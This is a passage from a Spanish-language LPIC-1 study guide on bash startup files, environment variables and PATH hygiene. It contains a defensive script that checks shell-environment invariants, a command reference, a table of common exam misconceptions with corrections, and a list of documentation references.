[ -n "${BASH_VERSION-}" ] && [ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"
EOF
$ ssh bob@node01 'bash -lc "command -v platformctl"'
/opt/toolchain/bin/platformctl
```

### 8.8 Un script de verificación que podés distribuir

```bash
#!/usr/bin/env bash
# /opt/toolchain/bin/verify-shell-env — assert the shell environment contract.
# Exit 0 = all invariants hold. Exit 1 = at least one violated.
set -uo pipefail

fail=0
check() {
    local desc="$1"; shift
    if "$@" >/dev/null 2>&1; then
        printf '  \033[32mPASS\033[0m  %s\n' "$desc"
    else
        printf '  \033[31mFAIL\033[0m  %s\n' "$desc"
        fail=1
    fi
}

printf '== profile.d is POSIX-clean ==\n'
for f in /etc/profile.d/*.sh; do
    check "sh -n $f" sh -n "$f"
done

printf '== PATH hygiene ==\n'
check "no empty field in PATH"  bash -c '[[ ":$PATH:" != *"::"* && "$PATH" != :* && "$PATH" != *: ]]'
check "no '.' in PATH"          bash -c '[[ ":$PATH:" != *":.:"* ]]'
check "no duplicate entries"    bash -c \
    'n=$(tr : "\n" <<<"$PATH" | grep -c .); u=$(tr : "\n" <<<"$PATH" | sort -u | grep -c .); [ "$n" -eq "$u" ]'

printf '== no writable directory in PATH ==\n'
IFS=: read -ra _p <<<"$PATH"
for d in "${_p[@]}"; do
    [ -d "$d" ] || continue
    check "not group/other writable: $d" bash -c \
        'case "$(stat -c %A "$1")" in *w*w*|*w*t*) exit 1;; esac' _ "$d"
done

printf '== login shell resolves the toolchain ==\n'
check "platformctl on login PATH" bash -lc 'command -v platformctl'
check "PLATFORM_REGION exported"  bash -lc '[ -n "${PLATFORM_REGION:-}" ]'

printf '== non-interactive shells are silent ==\n'
check "bash -c produces no output" bash -c '[ -z "$(bash -c true 2>&1)" ]'

printf '== skeleton is syntactically valid ==\n'
for f in /etc/skel/.bashrc /etc/skel/.bash_profile; do
    [ -f "$f" ] && check "bash -n $f" bash -n "$f"
done
[ -f /etc/skel/.profile ] && check "sh -n /etc/skel/.profile" sh -n /etc/skel/.profile

printf '== sudo secure_path is set ==\n'
check "secure_path defined" bash -c 'sudo -n grep -qr secure_path /etc/sudoers /etc/sudoers.d'

exit "$fail"
```

```bash
$ verify-shell-env
== profile.d is POSIX-clean ==
  PASS  sh -n /etc/profile.d/10-platform-path.sh
  PASS  sh -n /etc/profile.d/20-platform-exports.sh
  PASS  sh -n /etc/profile.d/50-platform-lib.sh
  PASS  sh -n /etc/profile.d/90-platform-interactive.sh
== PATH hygiene ==
  PASS  no empty field in PATH
  PASS  no '.' in PATH
  PASS  no duplicate entries
== no writable directory in PATH ==
  PASS  not group/other writable: /opt/toolchain/bin
  PASS  not group/other writable: /usr/local/sbin
  PASS  not group/other writable: /usr/local/bin
  PASS  not group/other writable: /usr/sbin
  PASS  not group/other writable: /usr/bin
  PASS  not group/other writable: /sbin
  PASS  not group/other writable: /bin
== login shell resolves the toolchain ==
  PASS  platformctl on login PATH
  PASS  PLATFORM_REGION exported
== non-interactive shells are silent ==
  PASS  bash -c produces no output
== skeleton is syntactically valid ==
  PASS  bash -n /etc/skel/.bashrc
  PASS  bash -n /etc/skel/.bash_profile
  PASS  sh -n /etc/skel/.profile
== sudo secure_path is set ==
  PASS  secure_path defined
$ echo $?
0
```

---

## 9. Referencia de comandos y trampas del examen

### 9.1 Los comandos que tenés que poder producir de memoria

```bash
# Shell type
shopt -q login_shell ; echo $-
# Variables
export VAR=value        declare -x VAR=value      export -p
unset VAR               export -n VAR             readonly VAR
set                     set -o                    shopt
env                     printenv VAR              declare -p VAR
env -i CMD              env -u VAR CMD            VAR=x CMD
set -a ; . file ; set +a
# PATH
PATH="$PATH:/new"; export PATH
hash            hash -r            hash -d cmd
type -a cmd     type -t cmd        type -P cmd     which cmd
# Functions and aliases
name() { commands; }        function name { commands; }
declare -f name             declare -F              unset -f name
export -f name              local var               return N
alias a='cmd'   alias   unalias a   unalias -a
command cmd     builtin cmd         enable -n cmd
# Sourcing
. ./file        source ./file
# Skeleton
useradd -m -k /etc/skel -s /bin/bash user
grep SKEL /etc/default/useradd /etc/adduser.conf
# Lists
a ; b     a && b     a || b     a & b     (a)     { a; }     ! a
```

### 9.2 Trampas que aparecen en el examen y en producción

| Afirmación | Veredicto | Por qué |
|---|---|---|
| "Un shell de login lee `~/.bashrc`." | **Falso** | Solo mediante un gancho explícito en `~/.bash_profile`/`~/.profile`. |
| "Si existen tanto `~/.bash_profile` como `~/.profile`, se leen ambos." | **Falso** | Gana el primer archivo legible en el orden `~/.bash_profile`, `~/.bash_login`, `~/.profile`; el resto se ignora. |
| "`source` y `.` difieren." | **Falso** | `source` es un sinónimo de bash para el `.` de POSIX. Ambos corren en el shell *actual*. |
| "`./script.sh` y `. script.sh` son equivalentes." | **Falso** | `./script.sh` bifurca un hijo; `.` corre en el shell actual y sus cambios de variables/`cd` persisten. |
| "`export` crea una variable." | **Falso** | Define el atributo de exportación sobre una variable existente o recién asignada. |
| "`env` muestra todas las variables de shell." | **Falso** | Solo las exportadas. Usá `set` o `declare -p`. |
| "Los alias funcionan en scripts." | **Falso** | Están deshabilitados en shells no interactivos salvo `shopt -s expand_aliases`, y se expanden al parsear. |
| "`a && b \|\| c` es if/else." | **Falso** | Si `b` falla, `c` también se ejecuta. |
| "Editar `/etc/skel` actualiza a los usuarios existentes." | **Falso** | Se copia solo al crear la cuenta. |
| "`~/.bash_logout` siempre corre cuando el shell sale." | **Falso** | Solo para shells *de login* interactivos. No para `ssh host cmd`, cron ni `systemd`. |
| "Un shell no interactivo no lee nada." | **Casi** | Se consulta `$BASH_ENV`, y el bash lanzado por `sshd` lee `~/.bashrc`. |
| "`PATH=/usr/bin:` es lo mismo que `PATH=/usr/bin`." | **Falso** | El campo vacío final significa el directorio actual. |
| "El estado de salida de un pipeline es el de la primera falla." | **Falso** | Es el estado del *último* comando, salvo con `set -o pipefail`. |
| "`local v=$(cmd)` propaga la falla de `cmd`." | **Falso** | El estado es el de `local`, siempre `0`. Separá la declaración. |

---

## Referencias

**Objetivos de certificación**

- LPI — Objetivos del examen 102-500 (Tema 105, *Shells and Shell Scripting*; objetivo 105.1 *Customize and use the shell environment*): https://www.lpi.org/our-certifications/exam-102-objectives/
- LPI — Objetivos del examen 101-500 (examen complementario de LPIC-1 v5.0): https://www.lpi.org/our-certifications/exam-101-objectives/
- LPI — Descripción general de la certificación LPIC-1 Linux Administrator: https://www.lpi.org/our-certifications/lpic-1-overview/

**Bash**

- GNU Bash Reference Manual — *Bash Startup Files*: https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html
- GNU Bash Reference Manual — *Shell Functions*: https://www.gnu.org/software/bash/manual/html_node/Shell-Functions.html
- GNU Bash Reference Manual — *Aliases*: https://www.gnu.org/software/bash/manual/html_node/Aliases.html
- GNU Bash Reference Manual — *Lists of Commands*: https://www.gnu.org/software/bash/manual/html_node/Lists.html
- GNU Bash Reference Manual — *Bash Variables* (`BASH_ENV`, `PROMPT_COMMAND`, `PS1`–`PS4`, `HISTCONTROL`, `TMOUT`, `FUNCNAME`, `PIPESTATUS`): https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html
- GNU Bash Reference Manual — *Bourne Shell Builtins* (`.`, `export`, `set`, `unset`, `readonly`, `hash`): https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html
- GNU Bash Reference Manual — *Bash Builtins* (`alias`, `declare`, `local`, `command`, `builtin`, `enable`, `type`, `source`, `shopt`): https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html
- GNU Bash Reference Manual — *The Shopt Builtin*: https://www.gnu.org/software/bash/manual/html_node/The-Shopt-Builtin.html
- GNU Bash Reference Manual — *Bash POSIX Mode*: https://www.gnu.org/software/bash/manual/html_node/Bash-POSIX-Mode.html
- GNU Bash Reference Manual — *Command Search and Execution*: https://www.gnu.org/software/bash/manual/html_node/Command-Search-and-Execution.html
- Página de manual `bash(1)`: https://man7.org/linux/man-pages/man1/bash.1.html
- Página principal de GNU Bash y notas de versión: https://www.gnu.org/software/bash/

**POSIX / estándares**

- The Open Group Base Specifications — *Shell Command Language*: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html
- The Open Group Base Specifications — utilidad `sh`: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/sh.html
- The Open Group Base Specifications — *Environment Variables* (Capítulo 8): https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap08.html
- Página de manual `environ(7)`: https://man7.org/linux/man-pages/man7/environ.7.html
- Página de manual `execve(2)`: https://man7.org/linux/man-pages/man2/execve.2.html

**Aprovisionamiento de cuentas y PAM**

- Página de manual `useradd(8)`: https://man7.org/linux/man-pages/man8/useradd.8.html
- Página de manual `login.defs(5)` (`UMASK`, `HOME_MODE`, `CREATE_HOME`): https://man7.org/linux/man-pages/man5/login.defs.5.html
- Proyecto upstream shadow-utils: https://github.com/shadow-maint/shadow
- `adduser.conf(5)` (Debian): https://manpages.debian.org/stable/adduser/adduser.conf.5.en.html
- Página de manual `pam_env(8)` (`/etc/environment`, `/etc/security/pam_env.conf`): https://man7.org/linux/man-pages/man8/pam_env.8.html
- Página de manual `pam_mkhomedir(8)`: https://man7.org/linux/man-pages/man8/pam_mkhomedir.8.html
- Documentación del proyecto Linux-PAM: https://github.com/linux-pam/linux-pam
- Red Hat — `authselect(8)` y la característica `with-mkhomedir`: https://man7.org/linux/man-pages/man8/authselect.8.html

**Entornos de servicios y planificadores**

- `systemd.exec(5)` — `Environment=`, `EnvironmentFile=`, `PassEnvironment=`: https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html
- `systemd-system.conf(5)` — `DefaultEnvironment=`: https://www.freedesktop.org/software/systemd/man/latest/systemd-system.conf.html
- `systemd.environment-generator(7)`: https://www.freedesktop.org/software/systemd/man/latest/systemd.environment-generator.html
- Página de manual `crontab(5)` (entorno de un job de cron): https://man7.org/linux/man-pages/man5/crontab.5.html

**Fronteras de privilegio y sesiones remotas**

- `sudoers(5)` — `env_reset`, `env_keep`, `secure_path`: https://www.sudo.ws/docs/man/sudoers.man/
- `sudo(8)` — `-i` frente a `-s`: https://www.sudo.ws/docs/man/sudo.man/
- OpenSSH `sshd_config(5)` — `AcceptEnv`, `PermitUserEnvironment`, `ClientAliveInterval`: https://man.openbsd.org/sshd_config
- OpenSSH `ssh_config(5)` — `SendEnv`, `SetEnv`: https://man.openbsd.org/ssh_config

**Seguridad**

- NVD — CVE-2014-6271 (Shellshock, parseo de importación de funciones en bash): https://nvd.nist.gov/vuln/detail/CVE-2014-6271
- GNU — serie oficial de parches de bash 4.3 (los parches 025–027 abordan la importación de funciones): https://ftp.gnu.org/gnu/bash/bash-4.3-patches/
- Red Hat — artículo sobre la vulnerabilidad Shellshock: https://access.redhat.com/security/cve/CVE-2014-6271

**Herramientas usadas en este material**

- ShellCheck — análisis estático para scripts de shell: https://www.shellcheck.net/wiki/
- Bats-core — Bash Automated Testing System: https://bats-core.readthedocs.io/en/stable/
- Ansible — opción `validate` de `ansible.builtin.copy` / `template`: https://docs.ansible.com/ansible/latest/collections/ansible/builtin/template_module.html
- Ansible — módulo `ansible.builtin.user`: https://docs.ansible.com/ansible/latest/collections/ansible/builtin/user_module.html
- cloud-init — referencia de módulos (`users_groups`, `write_files`, `runcmd`): https://cloudinit.readthedocs.io/en/latest/reference/modules.html
- Kubernetes — configurar un pod para usar un ConfigMap: https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/
- Kubernetes — definir variables de entorno para un contenedor: https://kubernetes.io/docs/tasks/inject-data-application/define-environment-variable-container/
- Docker — referencia del Dockerfile (`ENV`, `ENTRYPOINT`, `CMD`): https://docs.docker.com/reference/dockerfile/
- Página de manual `strace(1)`: https://man7.org/linux/man-pages/man1/strace.1.html
- freedesktop.org — XDG Base Directory Specification: https://specifications.freedesktop.org/basedir-spec/latest/